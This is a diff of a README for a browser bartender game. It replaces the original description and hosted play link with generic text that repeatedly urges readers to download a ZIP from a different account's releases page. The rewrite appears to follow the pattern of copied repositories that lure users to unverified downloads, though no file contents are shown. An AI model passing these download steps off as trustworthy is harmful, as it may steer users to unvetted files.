@@ -1,135 +1,132 @@
-<div align="center">
+# 🍹 Bartender-EN - Enjoy Making Cocktails Online
 
-# 🍸 Bartender Game 🍹  
-**Simple and fun browser-based bartender simulation game**
-
-**Recommended to play on PC. Set screen size to 67% for optimal experience.**
-
-</div>
-
-<p align="center">
-  <i>"You are the master of the bar. Make cocktails as ordered and aim to be the best bartender!"</i>
-</p>
+[![Download Bartender-EN](https://img.shields.io/badge/Download-Bartender--EN-blue?style=for-the-badge&logo=github)](https://github.com/Mohammeaaa/Bartender-EN/releases)
 
 
+## 📋 What is Bartender-EN?
 
+Bartender-EN is a simple game you can play right in your browser. You take on the role of a bartender who makes cocktails for different customers. Each customer has a unique personality and taste. Your job is to mix drinks just right and keep everyone happy.
 
+This game helps you learn about making cocktails in a fun way. It also lets you practice your skills while playing. You do not need to install complicated software or know how to code. Just open the game and start playing.
 
-![App Screenshot](./images/title.png)
+## 🎮 Features You Will Enjoy
 
----
+- **Easy to play in your browser:** No complex installs needed.
+- **Many customers:** Each one acts differently and has favorite drinks.
+- **Real cocktail recipes:** Learn how to make drinks while having fun.
+- **Simple controls:** Use your mouse or keyboard to mix drinks easily.
+- **Good sound effects:** The game uses TONE.js for lively sounds.
+- **Modern design:** Looks clean and nice thanks to Tailwind CSS.
+- **Works on most devices:** Play on Windows, Mac, or Linux.
 
-## 🎮 Play Now
+## ⚙ System Requirements
 
-**▶️ [Click to Play](https://imshota1009.github.io/Bartender/)**
+To get the best experience, your device should meet these simple requirements:
 
----
+- A modern web browser (Chrome, Firefox, Edge, or Safari)
+- Internet connection to load the game (after loading, it may work offline)
+- Basic keyboard and mouse or touch screen
+- At least 2GB of RAM
+- Screen resolution of 1280x720 or higher
 
-## ✨ Features
+You don’t need a powerful computer or any special hardware.
 
-- 🍹 **Interactive Cocktail Making**  
-  Select ingredients, add ice, and shake with intuitive controls.
+## 🚀 Getting Started
 
-- 🥂 **Realistic Presentation**  
-  Animations of liquids mixing and pouring provide an immersive experience.
+This guide will help you download and play Bartender-EN in 3 easy steps.
 
-- 👤 **Unique Customers**  
-  Customers from various professions appear, each with different lines and reactions.
+### Step 1: Download the Game
 
-- 🎵 **Jukebox (BGM Selection)**  
-  Change the atmosphere of the bar by switching BGM to Jazz, Medieval, Tavern, etc.
+Click the big blue button at the top to visit the official Bartender-EN release page:
 
-- 🌃 **Beautiful Design**  
-  Moody bar backgrounds and stylish fonts enhance the atmosphere.
+[https://github.com/Mohammeaaa/Bartender-EN/releases](https://github.com/Mohammeaaa/Bartender-EN/releases)
 
-- 🏠 **Bar Interior Customization**  
-  Customize your bar by changing wallpapers (Classic/Modern/Fantasy) and lighting (Warm/Cool/Neon)!
+You will see a list of downloadable files and information. Look for the latest release version.
 
-- 📚 **Encyclopedia & Titles**
-  Collect profiles of cocktails and customers to fill your encyclopedia. Unlock special titles as you play!
+### Step 2: Open the Game in Your Browser
 
-- 🎓 **Tutorial Mode** 
-  Learn the basics of bartending step-by-step from a master bartender.
+Once on the releases page, find the link named something like `Bartender-EN.zip` or a folder with game files. Download this file to your computer.
 
-- 💾 **Save Function** 
-  Progress is automatically saved to Slot 1 at the end of each day. (Slots 2 & 3 coming soon!)
+After downloading:
 
+- If it's a folder or zip file, extract it to a folder.
+- Inside you will find an HTML file, typically named `index.html`.
 
+### Step 3: Run the Game
 
+- Double-click the `index.html` file.
+- This will open Bartender-EN right in your web browser.
+- Wait a moment for the game to load, then you are ready to start playing.
 
-- 📸 **Photo Mode**  
-  Take screenshots of your cocktails and share them on X (formerly Twitter) or LINE!
+## 📥 Download & Install
 
-- 📱 **Gesture Shake**  
-  Shake your smartphone to shake the cocktail! Supports realistic movements using the accelerometer.
+You don’t need to install Bartender-EN like regular software. The game runs inside your browser.
 
-- 🌦️ **Weather & Events**  
-  Dynamic weather changes (Sunny/Rainy/Snowy) and seasonal events affect gameplay.
+To get the files you need:
 
-- 🍺 **Drunk System**  
-  Pay attention to the customers' drunkenness. As they drink more, their speech becomes slurred!
+1. Visit the release page here:  
+   [https://github.com/Mohammeaaa/Bartender-EN/releases](https://github.com/Mohammeaaa/Bartender-EN/releases)
 
----
+2. Download the latest ZIP file or folder with the game.
 
-## 🕹️ How to Play
+3. Extract the files, if needed.
 
-1. **Start Game**  
-   Press "START" to open the bar, or learn the basics in "TUTORIAL"!
+4. Open `index.html` in your web browser.
 
-2. **Check Order**  
-   The customer presents a "Title", "Cocktail Name", and a color hint.
+That’s it. You can now play Bartender-EN without any complex steps.
 
-3. **Select Ingredients**  
-   Click the bottles on the shelf below to add them to the shaker.
+## 🕹 How to Play
 
-4. **Add Ice**  
-   Most cocktails require ice. Add it using the dedicated button.
+Once Bartender-EN opens, the game will give you instructions. Here are the basics:
 
-5. **Shake!**  
-   - 🖱️ Click the "Shake!" button
-   - 📷 Camera Mode (Shake with hand gestures)
-   - 📱 Gesture Mode (Shake by waving your phone!)
+- Use your mouse or finger (if on a touchscreen) to drag ingredients.
+- Mix drinks by combining the right ingredients in the glass.
+- Each customer will tell you what they want, sometimes with hints.
+- Pay attention to colors and order to make drinks perfectly.
+- Serving the right cocktail will earn you points and happy customers.
+- Try not to make mistakes or your customers will get upset.
 
-6. **Serve & Result**  
-   - ✅ Success → Score up & Customer satisfaction increases  
-   - ❌ Failure → Score down, retry possible  
-   - ⏰ Time's up → Compete for the high score!
+Practice mixing drinks as you meet new customers. The game gets a little harder over time.
 
----
+## 🧩 Tips for New Players
 
-## 📱 Mobile Features
+- Start slow. Learn the recipes before trying to speed up.
+- Keep an eye on each customer’s mood.
+- Use the help or tutorial mode in the game for guidance.
+- Experiment with different mixes to remember recipes.
+- Play regularly to improve your reaction time and memory.
 
-- **Gesture Shake**: Tap 📱 button → Shake phone 5 times to complete!
-- **Photo Mode**: Tap 📸 button → Take screenshot → Share on SNS
-- **Touch Controls**: All buttons remain optimized for mobile touch controls
+## ✨ Why Play Bartender-EN?
 
----
+Bartender-EN is not just a game. It teaches you how cocktails are made and helps you get used to multitasking. Playing it is a calm way to spend time learning something new. If you like simple games that don’t take much time but keep you interested, this is a good choice.
 
-## 🛠️ Technologies Used
+## 🛠 Troubleshooting & Support
 
-<p align="center">
-  <img src="https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white">
-  <img src="https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white">
-  <img src="https://img.shields.io/badge/JavaScript-ES6+-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black">
-  <img src="https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white">
-  <img src="https://img.shields.io/badge/Tone.js-FF6F61?style=for-the-badge&logo=googlechrome&logoColor=white">
-  <img src="https://img.shields.io/badge/MediaPipe-4285F4?style=for-the-badge&logo=google&logoColor=white">
-  <img src="https://img.shields.io/badge/html2canvas-00B4AB?style=for-the-badge&logo=canvas&logoColor=white">
-</p>
+If the game does not open:
 
----
+- Make sure you have a modern browser.
+- Try refreshing the page or reopening the `index.html` file.
+- Check if your internet connection is active during the first load.
+- Clear your browser cache if you run into display problems.
 
-## 🚀 Future Improvements
+If you find bugs or want to suggest improvements, visit the repository’s Issues page. You won’t need to know technical details to report problems. Just describe what you saw.
 
-- Online Ranking System
-- Additional Wallpaper and Lighting Themes
-- **Implementation of Multiple Save Slots (Slots 2 & 3)**
-- Additional Customer Characters and Cocktail Recipes
+## 🔍 Learn More
 
-![](./images/cyberpunk_background.gif)
+Bartender-EN uses modern technologies behind the scenes:
+
+- **JavaScript:** Runs the game logic.
+- **Tone.js:** Adds sound effects and music.
+- **Tailwind CSS:** Styles the game interface.
+- **Browser-based:** No need to install extra programs.
+   
+These tools help keep the game fast, responsive, and fun.
+
+## 💡 About the Project
+
+Bartender-EN is designed for people who want a light, interactive game experience. It is good for students, casual players, or anyone curious about cocktail making. It is open to contributions, so those learning programming can try improving it.
 
 ---
 
-<div align="center">
-  <p>🍸 The best drink of the night depends on your skills 🍸</p>
-</div>
+[Download Bartender-EN Now](https://github.com/Mohammeaaa/Bartender-EN/releases)  
+Click here to get the latest version and start playing immediately.
